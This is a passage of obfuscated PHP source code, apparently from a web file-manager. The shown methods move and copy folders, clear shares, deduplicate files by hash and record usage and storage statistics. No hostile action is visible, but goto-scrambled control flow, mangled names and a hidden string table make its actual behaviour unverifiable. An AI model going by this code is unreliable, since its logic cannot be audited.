$FäÕğ°õ’®[$CÎ–Áõä»ƒ[379]] == $CÎ–Áõä»ƒ[83]; goto D¢ä…Ìˆ‘; D¢ä…Ìˆ‘: $eĞ¸ÔŠˆ = $Bò£ˆµÁº ? $Bò£ˆµÁº : $FäÕğ°õ’®[$CÎ–Áõä»ƒ[28]]; $A±¥‚„ ’ = $this->fileNameExistCache($fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ); $this->lockMoveStart($C‰îÜ¡«³Æ); goto A°Ê–¯®¿Í; cÜî…×é¾Õ: return $DãÊ¡‚²¢ª; goto e¿¯„Í¡Æ; e¿¯„Í¡Æ: } private function _moveForce($dÀ”í©í‰, $C¶ŠÅ¨õİ, $A½ØÌ‘éé») { goto A‡ï››îÕ; cªß‹¨«†‰: if ($aîù äŒ‡Ò) { $dÏŞ¾Ä‘´¤ = array($eœ¨®†ÊÜ[534] => array($eœ¨®†ÊÜ[492], $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[468]] . $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[378]] . $eœ¨®†ÊÜ[493])); $Bñ‰ø˜‘áÏ = $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[468]] . $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[378]] . $eœ¨®†ÊÜ[47]; $AÖ¶‘¬³…Ñ = $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[468]] . $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[378]] . $eœ¨®†ÊÜ[47] . $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[378]] . $eœ¨®†ÊÜ[47]; $c¼¾ƒé½‹˜ = array($eœ¨®†ÊÜ[534] => array($eœ¨®†ÊÜ[543], "\x72\145\160\x6c\141\x63\145\x28\160\141\x72\145\156\164\114\145\166\x65\154\x2c\47{$Bñ‰ø˜‘áÏ}\x27\54\47{$AÖ¶‘¬³…Ñ}\47\x29"), $eœ¨®†ÊÜ[530] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[380]], $eœ¨®†ÊÜ[531] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[465]]); if ($AùôĞ‘‡Ğ¤) { $c¼¾ƒé½‹˜[$eœ¨®†ÊÜ[405]] = 0; } $this->where($dÏŞ¾Ä‘´¤)->data($c¼¾ƒé½‹˜)->save(); } $this->where(array($eœ¨®†ÊÜ[392] => $dÀ”í©í‰))->data($b‰º±¾å»)->save(); return $dÀ”í©í‰; goto AŠååÛôø; cöÙâáÏÁ: if (!$fììŠ†¯‰) { Model($eœ¨®†ÊÜ[463])->authClear($dÀ”í©í‰); } $AùôĞ‘‡Ğ¤ = $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[406]] == $eœ¨®†ÊÜ[83] && $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[406]] != $eœ¨®†ÊÜ[83]; if ($AùôĞ‘‡Ğ¤) { $b‰º±¾å»[$eœ¨®†ÊÜ[405]] = 0; } goto cªß‹¨«†‰; e†Ü‹Ö´Ä§: $aîù äŒ‡Ò = $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[379]] == $eœ¨®†ÊÜ[83]; $b‰º±¾å» = array($eœ¨®†ÊÜ[377] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[378]], $eœ¨®†ÊÜ[534] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[468]] . $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[378]] . $eœ¨®†ÊÜ[47], $eœ¨®†ÊÜ[530] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[380]], $eœ¨®†ÊÜ[531] => $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[465]], $eœ¨®†ÊÜ[533] => USER_ID, $eœ¨®†ÊÜ[395] => $A½ØÌ‘éé»); $fììŠ†¯‰ = $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[380]] == SourceModel::TYPE_GROUP && $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[380]] == SourceModel::TYPE_GROUP && $fÅ±“ãé‡ñ[$eœ¨®†ÊÜ[465]] == $d±ïèƒ¾ƒ§[$eœ¨®†ÊÜ[465]]; goto cöÙâáÏÁ; A‡ï››îÕ: $eœ¨®†ÊÜ =& $_SERVER[í…¶]; $fÅ±“ãé‡ñ = $this->sourceInfo($dÀ”í©í‰); $d±ïèƒ¾ƒ§ = $this->sourceInfo($C¶ŠÅ¨õİ); goto e†Ü‹Ö´Ä§; AŠååÛôø: } private function clearShare($cŒ»²Ø‹ÅÔ, $D¤ÄËÓ¥¼) { goto FÍêàÓ…É; c½È½‡á‚‡: if (!$A•Ë”¿™ëÈ) { return; } $A•Ë”¿™ëÈ = array_to_keyvalue($A•Ë”¿™ëÈ, $Bˆ¼ÙÃ¬Œ[33], $Bˆ¼ÙÃ¬Œ[450]); $BÒ‘Œ¥Œ™† = array($Bˆ¼ÙÃ¬Œ[450] => array($Bˆ¼ÙÃ¬Œ[7], $A•Ë”¿™ëÈ)); goto AÌŒŒˆ³”¦; AÌŒŒˆ³”¦: Model($Bˆ¼ÙÃ¬Œ[545])->where($BÒ‘Œ¥Œ™†)->save(array($Bˆ¼ÙÃ¬Œ[457] => 0)); Model($Bˆ¼ÙÃ¬Œ[546])->where($BÒ‘Œ¥Œ™†)->delete(); goto EÙ¢ÍìÎ£å; FŠñ‹‘Ôõ: if (!$B½Ä‹ÕİÊ) { return; } $BÒ‘Œ¥Œ™† = array($Bˆ¼ÙÃ¬Œ[378] => array($Bˆ¼ÙÃ¬Œ[7], $B½Ä‹ÕİÊ), $Bˆ¼ÙÃ¬Œ[457] => 1); $A•Ë”¿™ëÈ = Model($Bˆ¼ÙÃ¬Œ[545])->field($Bˆ¼ÙÃ¬Œ[450])->where($BÒ‘Œ¥Œ™†)->select(); goto c½È½‡á‚‡; Aåµ­›¡í: if ($f¾ğè÷‹ [$Bˆ¼ÙÃ¬Œ[465]] == $bƒ¥ °ÒÇ [$Bˆ¼ÙÃ¬Œ[465]] && $f¾ğè÷‹ [$Bˆ¼ÙÃ¬Œ[380]] == $Bˆ¼ÙÃ¬Œ[544]) { return; } $BÒ‘Œ¥Œ™† = array($Bˆ¼ÙÃ¬Œ[468] => array($Bˆ¼ÙÃ¬Œ[492], $f¾ğè÷‹ [$Bˆ¼ÙÃ¬Œ[468]] . $cŒ»²Ø‹ÅÔ . $Bˆ¼ÙÃ¬Œ[493])); $B½Ä‹ÕİÊ = $this->field($Bˆ¼ÙÃ¬Œ[392])->where($BÒ‘Œ¥Œ™†)->getField($Bˆ¼ÙÃ¬Œ[378], !0); goto FŠñ‹‘Ôõ; FÍêàÓ…É: $Bˆ¼ÙÃ¬Œ =& $_SERVER[í…¶]; $f¾ğè÷‹  = $this->sourceInfo($cŒ»²Ø‹ÅÔ); $bƒ¥ °ÒÇ  = $this->sourceInfo($D¤ÄËÓ¥¼); goto Aåµ­›¡í; EÙ¢ÍìÎ£å: } public function copyFolderFromIO($cæéê¶Š­ó, $E­„Ù„¿‚É, $d©ñôÔšÖ, $Fãàâ°„´, $D¾Ûì—”Ó, $Bª‹Åå‡êÃ = false) { goto dÓÊ­³”…; fŒƒŠŸ‚°: $this->updateModifyTime($d©ñôÔšÖ); return $E×Ì‘ƒœÓÍ; goto CÁ“İ’°ñ; dÓÊ­³”…: $BÎÇŞßŸˆ¤ =& $_SERVER[í…¶]; $F¡­ä­Õ‹• = array($BÎÇŞßŸˆ¤[511] => array(), $BÎÇŞßŸˆ¤[512] => array(), $BÎÇŞßŸˆ¤[510] => array(), $BÎÇŞßŸˆ¤[547] => array()); $c‡•‹¬¬†ƒ = $Bª‹Åå‡êÃ ? $Bª‹Åå‡êÃ : $cæéê¶Š­ó->getPathName($cæéê¶Š­ó->pathThis($E­„Ù„¿‚É)); goto b øª¹¡Ê; CÜ³§èŸ›á: Hook::trigger($BÎÇŞßŸˆ¤[549]); if ($E×Ì‘ƒœÓÍ) { $this->folderSizeResetChildren($E×Ì‘ƒœÓÍ); } $this->_childrenListClear(); goto c¨¡ÚÔç²; aÈ•ˆ°â¤: if ($cÚ»Ñ²ºø) { $this->_childrenAllMake($cÚ»Ñ²ºø); } Hook::trigger($BÎÇŞßŸˆ¤[548]); $this->_copyChildTo($cæéê¶Š­ó, $E­„Ù„¿‚É, $E×Ì‘ƒœÓÍ, $Fãàâ°„´, $F¡­ä­Õ‹•, $D¾Ûì—”Ó); goto CÜ³§èŸ›á; b øª¹¡Ê: $cÚ»Ñ²ºø = $this->fileNameExist($d©ñôÔšÖ, $c‡•‹¬¬†ƒ); $E×Ì‘ƒœÓÍ = $this->mkdir($d©ñôÔšÖ, $c‡•‹¬¬†ƒ, $Fãàâ°„´); if (!$cÚ»Ñ²ºø || $Fãàâ°„´ == REPEAT_RENAME_FOLDER) { $Fãàâ°„´ = !1; } goto aÈ•ˆ°â¤; c¨¡ÚÔç²: Model($BÎÇŞßŸˆ¤[513])->addAll($F¡­ä­Õ‹•[$BÎÇŞßŸˆ¤[511]], array(), !0); Model($BÎÇŞßŸˆ¤[514])->eventCopy($E×Ì‘ƒœÓÍ); $this->saveAll($F¡­ä­Õ‹•[$BÎÇŞßŸˆ¤[512]]); goto EÚ¢­Ñ¸ÏŒ; EÚ¢­Ñ¸ÏŒ: Model($BÎÇŞßŸˆ¤[431])->linkAdd($F¡­ä­Õ‹•[$BÎÇŞßŸˆ¤[510]]); Model($BÎÇŞßŸˆ¤[431])->remove($F¡­ä­Õ‹•[$BÎÇŞßŸˆ¤[547]]); $this->folderSizeReset($d©ñôÔšÖ); goto fŒƒŠŸ‚°; CÁ“İ’°ñ: } private function _copyChildTo($eğÓ°°Şé, $CŞ§ª³·Â, $Cæ—¤‡í, $A¼Âöô‹¢, &$dÒŒ”ˆôè¬, $b“©ÑİŠ) { goto AÎ•¹ƒ™”; fÕÇÎñ‘Îç: $c½Ü×ÁÚçå = array_merge($DÓ¢”´Ù[$D±‚¡Àùñ¨[73]], $DÓ¢”´Ù[$D±‚¡Àùñ¨[74]]); $bµ’Ü—Ø Ô = $this->_addFiles($eğÓ°°Şé, $DÓ¢”´Ù[$D±‚¡Àùñ¨[73]], $b“©ÑİŠ); $D›Î±§Ôª† = array(); goto cªŠÂé¨â‚; E—Ÿ¤²½®”: $A¼ŸØçŒ”Í = $this->_childrenList($Cæ—¤‡í); $A¼ŸØçŒ”Í = array_to_keyvalue($A¼ŸØçŒ”Í, $D±‚¡Àùñ¨[28]); foreach ($c½Ü×ÁÚçå as $fåó¾±œœ) { $AÛÆÙ¢Š¸´ = $A¼ŸØçŒ”Í[$fåó¾±œœ[$D±‚¡Àùñ¨[28]]]; $Bø†Ù ‚ã½ = $AÛÆÙ¢Š¸´[$D±‚¡Àùñ¨[378]]; $this->_copyApplyMeta($AÛÆÙ¢Š¸´, $dÒŒ”ˆôè¬); if ($fåó¾±œœ[$D±‚¡Àùñ¨[29]] == $D±‚¡Àùñ¨[76]) { $fåó¾±œœ[$D±‚¡Àùñ¨[75]] = $eğÓ°°Şé->getPathInner($fåó¾±œœ[$D±‚¡Àùñ¨[75]]); $this->_copyChildTo($eğÓ°°Şé, $fåó¾±œœ[$D±‚¡Àùñ¨[75]], $Bø†Ù ‚ã½, $A¼Âöô‹¢, $dÒŒ”ˆôè¬, $b“©ÑİŠ); } } goto E§›…Ş¡­©; cªŠÂé¨â‚: foreach ($c½Ü×ÁÚçå as &$fåó¾±œœ) { goto bÜáß‘øÃâ; Cæ¥†¼Üã: if ($A¼Âöô‹¢) { $fËİƒÛæ§‘ = $this->fileNameExistCache($Cæ—¤‡í, $fåó¾±œœ[$D±‚¡Àùñ¨[28]]); if ($fËİƒÛæ§‘) { if ($fåó¾±œœ[$D±‚¡Àùñ¨[379]] || $A¼Âöô‹¢ == REPEAT_SKIP) { continue; } if ($A¼Âöô‹¢ == REPEAT_REPLACE) { $AÛÆÙ¢Š¸´ = $this->sourceInfoCache($fËİƒÛæ§‘); $a¿Î—Èª = $this->fileHistory($AÛÆÙ¢Š¸´, $fåó¾±œœ[$D±‚¡Àùñ¨[428]], $fåó¾±œœ[$D±‚¡Àùñ¨[77]]); if ($a¿Î—Èª) { $dÒŒ”ˆôè¬[$D±‚¡Àùñ¨[510]][] = $fåó¾±œœ[$D±‚¡Àùñ¨[428]]; } continue; } else { if ($A¼Âöô‹¢ == REPEAT_RENAME) { $fåó¾±œœ[$D±‚¡Àùñ¨[28]] = $this->fileNameAutoCache($Cæ—¤‡í, $fåó¾±œœ[$D±‚¡Àùñ¨[28]], $A¼Âöô‹¢, !1); } } } } if (!$fåó¾±œœ[$D±‚¡Àùñ¨[379]] && $fåó¾±œœ[$D±‚¡Àùñ¨[428]]) { $dÒŒ”ˆôè¬[$D±‚¡Àùñ¨[510]][] = $fåó¾±œœ[$D±‚¡Àùñ¨[428]]; } $D›Î±§Ôª†[] = $this->_makeItemData($fåó¾±œœ, $F§æÎÖ± , $fåó¾±œœ[$D±‚¡Àùñ¨[28]]); goto B«İƒØ¢‘æ; bÜáß‘øÃâ: if (isset($bµ’Ü—Ø Ô[$fåó¾±œœ[$D±‚¡Àùñ¨[28]]])) { $fåó¾±œœ = $bµ’Ü—Ø Ô[$fåó¾±œœ[$D±‚¡Àùñ¨[28]]]; } $fåó¾±œœ[$D±‚¡Àùñ¨[379]] = $fåó¾±œœ[$D±‚¡Àùñ¨[29]] == $D±‚¡Àùñ¨[76]; $fåó¾±œœ[$D±‚¡Àùñ¨[381]] = _get($fåó¾±œœ, $D±‚¡Àùñ¨[160], $D±‚¡Àùñ¨[33]); goto fêåøåæÑ; fêåøåæÑ: $fåó¾±œœ[$D±‚¡Àùñ¨[77]] = _get($fåó¾±œœ, $D±‚¡Àùñ¨[77], 0); $fåó¾±œœ[$D±‚¡Àùñ¨[428]] = _get($fåó¾±œœ, $D±‚¡Àùñ¨[428], 0); if (!isset($fåó¾±œœ[$D±‚¡Àùñ¨[550]]) && $fåó¾±œœ[$D±‚¡Àùñ¨[428]]) { $dÒŒ”ˆôè¬[$D±‚¡Àùñ¨[547]][] = $fåó¾±œœ[$D±‚¡Àùñ¨[428]]; } goto Cæ¥†¼Üã; B«İƒØ¢‘æ: } unset($fåó¾±œœ); if (!empty($D›Î±§Ôª†)) { $this->addAll($D›Î±§Ôª†); } goto E—Ÿ¤²½®”; AÎ•¹ƒ™”: $D±‚¡Àùñ¨ =& $_SERVER[í…¶]; $F§æÎÖ±  = $this->sourceInfoCache($Cæ—¤‡í); $DÓ¢”´Ù = $eğÓ°°Şé->listPath($CŞ§ª³·Â, !1, !0); goto fÕÇÎñ‘Îç; E§›…Ş¡­©: } private function _addFiles($cŒ–¯µÄİŒ, $CĞ¥”Èáã©, $eî¾Ÿ™”ˆô) { goto D­«Ì•®Ş¼; AŠâá˜Ò®Ô: $BßáªÊŞ´è = $Aóæ‹ÜŞ£›->where($FØÒËÂÜƒŒ)->select(); $BßáªÊŞ´è = $BßáªÊŞ´è ? $BßáªÊŞ´è : array(); foreach ($BßáªÊŞ´è as $C«²¹¦Àçë) { if (!isset($DºƒªØ¨ö®[$C«²¹¦Àçë[$Bõ¢íàê£›[163]]])) { continue; } $fŠÑº‰¶£ = $DºƒªØ¨ö®[$C«²¹¦Àçë[$Bõ¢íàê£›[163]]]; foreach ($fŠÑº‰¶£ as &$DçÖ¹äõ´) { $DçÖ¹äõ´[$Bõ¢íàê£›[428]] = $C«²¹¦Àçë[$Bõ¢íàê£›[428]]; $DçÖ¹äõ´[$Bõ¢íàê£›[550]] = !0; } unset($DçÖ¹äõ´); } goto eÓğ×ôÊÀ‘; B¬Û“ù¥èÕ: $FØÒËÂÜƒŒ = array($Bõ¢íàê£›[163] => array($Bõ¢íàê£›[7], array_keys($DºƒªØ¨ö®))); $BßáªÊŞ´è = $Aóæ‹ÜŞ£›->where($FØÒËÂÜƒŒ)->select(); $BßáªÊŞ´è = $BßáªÊŞ´è ? $BßáªÊŞ´è : array(); goto CŠ´Æ•ˆ…ó; a¨âàôÃÓ: foreach ($CĞ¥”Èáã© as &$DçÖ¹äõ´) { goto Cóò¤ØÔ™; Cóò¤ØÔ™: Hook::trigger($Bõ¢íàê£›[551], $DçÖ¹äõ´); $DçÖ¹äõ´[$Bõ¢íàê£›[75]] = $cŒ–¯µÄİŒ->getPathInner($DçÖ¹äõ´[$Bõ¢íàê£›[75]]); $B¥Ñº¤Ş = $cŒ–¯µÄİŒ->hashSimple($DçÖ¹äõ´[$Bõ¢íàê£›[75]]); goto aĞï¸¼¿––; dåó©’àò: $DçÖ¹äõ´[$Bõ¢íàê£›[163]] = $dÃÂŠ¡¨; Hook::trigger($Bõ¢íàê£›[552], $DçÖ¹äõ´); $DºƒªØ¨ö®[$dÃÂŠ¡¨][] =& $DçÖ¹äõ´; goto FÅ£¦Ã¶–; FÅ£¦Ã¶–: if (count($DºƒªØ¨ö®[$dÃÂŠ¡¨]) > 1) { $DçÖ¹äõ´[$Bõ¢íàê£›[550]] = !0; } goto aî…å¯¹É; aĞï¸¼¿––: $dÃÂŠ¡¨ = $cŒ–¯µÄİŒ->hashMd5($DçÖ¹äõ´[$Bõ¢íàê£›[75]]); if (strlen($dÃÂŠ¡¨) > 10 && !isset($DºƒªØ¨ö®[$dÃÂŠ¡¨])) { $DºƒªØ¨ö®[$dÃÂŠ¡¨] = array(); } $DçÖ¹äõ´[$Bõ¢íàê£›[164]] = $B¥Ñº¤Ş; goto dåó©’àò; aî…å¯¹É: } $FØÒËÂÜƒŒ = array($Bõ¢íàê£›[163] => array($Bõ¢íàê£›[7], array_keys($DºƒªØ¨ö®))); $Aóæ‹ÜŞ£› = Model($Bõ¢íàê£›[553]); goto AŠâá˜Ò®Ô; CŠ´Æ•ˆ…ó: foreach ($BßáªÊŞ´è as $C«²¹¦Àçë) { if (!isset($DºƒªØ¨ö®[$C«²¹¦Àçë[$Bõ¢íàê£›[163]]])) { continue; } $f‰‡îŞ¤‹Æ =& $DºƒªØ¨ö®[$C«²¹¦Àçë[$Bõ¢íàê£›[163]]]; foreach ($f‰‡îŞ¤‹Æ as &$DçÖ¹äõ´) { $DçÖ¹äõ´[$Bõ¢íàê£›[428]] = $C«²¹¦Àçë[$Bõ¢íàê£›[428]]; } unset($DçÖ¹äõ´); } $a‘éÎßéŞÎ = array(); foreach ($CĞ¥”Èáã© as $dæ‰ìá¿Õ) { $a‘éÎßéŞÎ[$dæ‰ìá¿Õ[$Bõ¢íàê£›[28]]] = $dæ‰ìá¿Õ; } goto fÔÇ‹Å‹Œ…; fÔÇ‹Å‹Œ…: return $a‘éÎßéŞÎ; goto fƒá¹Î¾; D­«Ì•®Ş¼: $Bõ¢íàê£› =& $_SERVER[í…¶]; if (!$CĞ¥”Èáã© || count($CĞ¥”Èáã©) == 0) { return array(); } $DºƒªØ¨ö® = array(); goto a¨âàôÃÓ; eÓğ×ôÊÀ‘: $dÕÇÙÒ¢š‡ = array(); foreach ($CĞ¥”Èáã© as $cì†Ş¼×ØÉ) { if (isset($cì†Ş¼×ØÉ[$Bõ¢íàê£›[550]]) && $cì†Ş¼×ØÉ[$Bõ¢íàê£›[550]]) { continue; } $b„½Àˆ¸¶Ã = $cŒ–¯µÄİŒ->getPathInner($cì†Ş¼×ØÉ[$Bõ¢íàê£›[75]]); $FË†Ëƒ±¿¬ = $Aóæ‹ÜŞ£›->addFileMake($b„½Àˆ¸¶Ã, $cì†Ş¼×ØÉ[$Bõ¢íàê£›[77]], $cì†Ş¼×ØÉ[$Bõ¢íàê£›[164]], $cì†Ş¼×ØÉ[$Bõ¢íàê£›[163]], $cì†Ş¼×ØÉ[$Bõ¢íàê£›[28]], $eî¾Ÿ™”ˆô); $dÕÇÙÒ¢š‡[] = $FË†Ëƒ±¿¬; } $Aóæ‹ÜŞ£›->addAll($dÕÇÙÒ¢š‡); goto B¬Û“ù¥èÕ; fƒá¹Î¾: } } define($_SERVER[í…¶][554], $_SERVER[í…¶][555]); goto A¸¦ğÛ®¸Ğ; B˜áö½–»±: class AnalysisModel extends ModelBaseLight { public function init($EîŒŸË·è) { $E‘à®Õä²Ã =& $_SERVER[í…¶]; $aµÙô¿†Ğ = array($E‘à®Õä²Ã[544] => array($E‘à®Õä²Ã[29] => $E‘à®Õä²Ã[2026], $E‘à®Õä²Ã[261] => array($E‘à®Õä²Ã[210], $E‘à®Õä²Ã[702], $E‘à®Õä²Ã[2027], $E‘à®Õä²Ã[2028])), $E‘à®Õä²Ã[2029] => array($E‘à®Õä²Ã[29] => $E‘à®Õä²Ã[2030], $E‘à®Õä²Ã[261] => array($E‘à®Õä²Ã[210], $E‘à®Õä²Ã[700], $E‘à®Õä²Ã[2031], $E‘à®Õä²Ã[2032], $E‘à®Õä²Ã[2033]))); if (!isset($aµÙô¿†Ğ[$EîŒŸË·è])) { return !1; } $this->optionType = $aµÙô¿†Ğ[$EîŒŸË·è][$E‘à®Õä²Ã[29]]; $this->field = $aµÙô¿†Ğ[$EîŒŸË·è][$E‘à®Õä²Ã[261]]; return !0; } public function listData($D¾©Â‘ˆã… = false, $F¡‰†­¤ñŸ = "\155\157\x64\x69\x66\171\124\151\x6d\x65", $D™¥ßÏÌõ· = false) { return parent::listData($D¾©Â‘ˆã…, $F¡‰†­¤ñŸ, $D™¥ßÏÌõ·); } public function trendList($FŸğìÃùÏŞ) { goto dÓ åáœ‰½; bÈÔ‘ÒÌ§º: if (!isset($f™ˆĞÒ´‚‚)) { $AÂïô×ÒÆ = $FŸğìÃùÏŞ == $b³ñ™¡ó¸È[544] ? $b³ñ™¡ó¸È[486] : $b³ñ™¡ó¸È[755]; $f™ˆĞÒ´‚‚ = Model($AÂïô×ÒÆ)->min($b³ñ™¡ó¸È[187]); } $aâ…ÙĞè”× = $b³ñ™¡ó¸È[2036] . ucfirst($FŸğìÃùÏŞ); $D‘¸Óª—Ã› = $this->dateList($f™ˆĞÒ´‚‚); goto AŠ£ˆË–º; AŠ£ˆË–º: foreach ($D‘¸Óª—Ã› as $aà­‹ò¢µö) { $this->{$aâ…ÙĞè”×}($aà­‹ò¢µö); } return $this->listData(); goto b¥ùŞç°ƒÇ; dÓ åáœ‰½: $b³ñ™¡ó¸È =& $_SERVER[í…¶]; $a»ÚßçÆ’ñ = $this->listData(); if ($a»ÚßçÆ’ñ) { $Cç—´¹íó• = end($a»ÚßçÆ’ñ); $aà­‹ò¢µö = date($b³ñ™¡ó¸È[2034], strtotime($b³ñ™¡ó¸È[2035])); if ($Cç—´¹íó•[$b³ñ™¡ó¸È[210]] == $aà­‹ò¢µö) { return $a»ÚßçÆ’ñ; } $f™ˆĞÒ´‚‚ = strtotime($Cç—´¹íó•[$b³ñ™¡ó¸È[210]]); } goto bÈÔ‘ÒÌ§º; b¥ùŞç°ƒÇ: } private function dateList($B¾ÌÆè´Åá) { $F¾—Õë ° =& $_SERVER[í…¶]; $bŸ¨­Ù²â® = $B¾ÌÆè´Åá; $Bøßƒ²¬Ú¯ = strtotime($F¾—Õë °[2035]); $fÌ¯¶·›šù = array(); while ($bŸ¨­Ù²â® <= $Bøßƒ²¬Ú¯) { $fÌ¯¶·›šù[] = date($F¾—Õë °[2034], $bŸ¨­Ù²â®); $bŸ¨­Ù²â® = strtotime($F¾—Õë °[2037], $bŸ¨­Ù²â®); } return $fÌ¯¶·›šù; } public function _recordUser($CŒŒ”êäç = '') { goto B—¨É„”ø¬; dÒ­ãëÄÅ: $DæËéÉî = array($eµ³¾£“éá[187] => array($eµ³¾£“éá[925], $f¬–´µ™‘)); $d °àËø = Model($eµ³¾£“éá[486])->where($DæËéÉî)->count($eµ³¾£“éá[1433]); $DæËéÉî[$eµ³¾£“éá[187]] = array($eµ³¾£“éá[321], array($cËÌÂ¿Â³½, $f¬–´µ™‘)); goto b„Ôõí¤¹¤; e£İ–”ô†—: $e™ĞÏâŒâ¥ = array($eµ³¾£“éá[210] => $CŒŒ”êäç, $eµ³¾£“éá[702] => (int) $d °àËø, $eµ³¾£“éá[2027] => (int) $Eñ†¸ïï–å, $eµ³¾£“éá[2028] => (int) $F´ÕÇìÀã); return $this->insert($e™ĞÏâŒâ¥); goto c¢æÖ«†”„; B—¨É„”ø¬: $eµ³¾£“éá =& $_SERVER[í…¶]; $cËÌÂ¿Â³½ = strtotime(date($eµ³¾£“éá[2038], strtotime($CŒŒ”êäç))); $f¬–´µ™‘ = strtotime(date($eµ³¾£“éá[2039], strtotime($CŒŒ”êäç))); goto dÒ­ãëÄÅ; b„Ôõí¤¹¤: $Eñ†¸ïï–å = Model($eµ³¾£“éá[486])->where($DæËéÉî)->count($eµ³¾£“éá[1433]); $DæËéÉî[$eµ³¾£“éá[29]] = $eµ³¾£“éá[2040]; $F´ÕÇìÀã = Model($eµ³¾£“éá[2041])->where($DæËéÉî)->count($eµ³¾£“éá[2042]); goto e£İ–”ô†—; c¢æÖ«†”„: } public function _recordStore($E¤ŞŸ¥î‹ = '') { goto D¯ĞôÌç½¼; BÇ¬Àß‡®¥: $Cã¸Ã¨Ú‰[$bµˆ¼î†[380]] = 1; $aÌ‰äÊÚÅ = Model($bµˆ¼î†[755])->where($Cã¸Ã¨Ú‰)->sum($bµˆ¼î†[77]); $Cã¸Ã¨Ú‰[$bµˆ¼î†[380]] = 2; goto fëØ›Ü¦; fëØ›Ü¦: $dƒƒ“Î¢ = Model($bµˆ¼î†[755])->where($Cã¸Ã¨Ú‰)->sum($bµˆ¼î†[77]); $bµİƒìŠ¨İ = array($bµˆ¼î†[210] => $E¤ŞŸ¥î‹, $bµˆ¼î†[700] => (int) $f«–İ½Æª†, $bµˆ¼î†[2031] => (int) $Cä­Éãí¯Á, $bµˆ¼î†[2032] => (int) $aÌ‰äÊÚÅ, $bµˆ¼î†[2033] => (int) $dƒƒ“Î¢); return $this->insert($bµİƒìŠ¨İ); goto EÓ÷¹½ö³; D¯ĞôÌç½¼: $bµˆ¼î† =& $_SERVER[í…¶]; $c¬Ò„æù–Œ = strtotime(date($bµˆ¼î†[2039], strtotime($E¤ŞŸ¥î‹))); $Cã¸Ã¨Ú‰ = array($bµˆ¼î†[187] => array($bµˆ¼î†[925], $c¬Ò„æù–Œ)); goto D¾Û£¾·‰Ö; D¾Û£¾·‰Ö: $Cä­Éãí¯Á = Model($bµˆ¼î†[431])->where($Cã¸Ã¨Ú‰)->sum($bµˆ¼î†[77]); $Cã¸Ã¨Ú‰[$bµˆ¼î†[379]] = 0; $f«–İ½Æª† = Model($bµˆ¼î†[755])->where($Cã¸Ã¨Ú‰)->sum($bµˆ¼î†[77]); goto BÇ¬Àß‡®¥; EÓ÷¹½ö³: } public function trend($BŠ»ŞÛµ¹î, $dÃ©™„ƒÎç) { goto f®‘çòÔ¦÷; aš¶ººáàĞ: if (empty($D‰ŞŒœíè…)) { $e»ºƒé¦ªÖ = date($fõÕ‹ÄÀ‚©[2034], strtotime($fõÕ‹ÄÀ‚©[2035])); $AÈè¦Ö‚âÅ = array($fõÕ‹ÄÀ‚©[210] => $e»ºƒé¦ªÖ); foreach ($EÚ´ø—ãë[$BŠ»ŞÛµ¹î] as $fë‘Ñ¤ïï¦ => $eäå°¦·í¾) { $AÈè¦Ö‚âÅ[$fë‘Ñ¤ïï¦] = 0; } $D‰ŞŒœíè…[] = $AÈè¦Ö‚âÅ; } $eµƒó£ÇÈ‘ = array(); foreach ($D‰ŞŒœíè… as $eäå°¦·í¾) { if ($BŠ»ŞÛµ¹î == $fõÕ‹ÄÀ‚©[2029] && $eäå°¦·í¾[$fõÕ‹ÄÀ‚©[2031]] > $eäå°¦·í¾[$fõÕ‹ÄÀ‚©[700]]) { $eäå°¦·í¾[$fõÕ‹ÄÀ‚©[2031]] = $eäå°¦·í¾[$fõÕ‹ÄÀ‚©[700]]; } foreach ($EÚ´ø—ãë[$BŠ»ŞÛµ¹î] as $fë‘Ñ¤ïï¦ => $CîÌä³ŠÂÈ) { $C»¦šŒáˆ = array($fõÕ‹ÄÀ‚©[210] => $eäå°¦·í¾[$fõÕ‹ÄÀ‚©[210]], $fõÕ‹ÄÀ‚©[1339] => $CîÌä³ŠÂÈ); $C»¦šŒáˆ[$C¸†ˆ¢°ˆĞ[$BŠ»ŞÛµ¹î]] = isset($eäå°¦·í¾[$fë‘Ñ¤ïï¦]) ? $eäå°¦·í¾[$fë‘Ñ¤ïï¦] : 0; $eµƒó£ÇÈ‘[] = $C»¦šŒáˆ; } } goto dÚ®Ãâø; eô¹ªøÍ°™: if ($D‰ŞŒœíè… && $dÃ©™„ƒÎç != $fõÕ‹ÄÀ‚©[1408]) { $D—¹ÎôÁµ³ = $D‰ŞŒœíè…[0][$fõÕ‹ÄÀ‚©[210]]; $a·ÜÅŠó· = $this->validDate($dÃ©™„ƒÎç, $D—¹ÎôÁµ³); $B³—–¤‚Ò = array(); $C¦œºõé¤ = array_to_keyvalue($D‰ŞŒœíè…, $fõÕ‹ÄÀ‚©[210]); foreach ($a·ÜÅŠó· as $e»ºƒé¦ªÖ) { if (isset($C¦œºõé¤[$e»ºƒé¦ªÖ])) { $C»¦šŒáˆ = $C¦œºõé¤[$e»ºƒé¦ªÖ]; } else { $C»¦šŒáˆ = end($D‰ŞŒœíè…); $C»¦šŒáˆ[$fõÕ‹ÄÀ‚©[210]] = $e»ºƒé¦ªÖ; if ($BŠ»ŞÛµ¹î == $fõÕ‹ÄÀ‚©[544]) { $C»¦šŒáˆ[$fõÕ‹ÄÀ‚©[2027]] = $C»¦šŒáˆ[$fõÕ‹ÄÀ‚©[2028]] = 0; } } $B³—–¤‚Ò[] = $C»¦šŒáˆ; } $D‰ŞŒœíè… = $B³—–¤‚Ò; } $EÚ´ø—ãë = 